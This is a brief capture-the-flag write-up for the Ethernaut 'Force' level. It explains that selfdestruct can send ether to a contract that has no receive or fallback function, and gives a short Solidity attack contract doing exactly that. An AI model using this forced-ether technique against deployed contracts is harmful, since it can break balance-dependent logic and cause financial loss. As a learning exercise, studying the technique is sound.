
# Ethernaut Level 9 Force
- This level is Force Problem, where we need to increase the balance of the contract but contract is empty.
- For solving this challenge, we need to understand selfdestruct opcode which is deprecated in solidity recently.
- selfdestruct will send the balance of the account to receiver in argument which doesn't check the receive or fallback present in the contract.


# Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SelfDestruct{
    address owner;
    constructor() payable{
        owner = msg.sender;
    }
    function attack(address   _receipient) payable external{
        require(address(this).balance > 0,"balance must be greater than 0");
        selfdestruct(_receipient);
    }
}
 
```
 



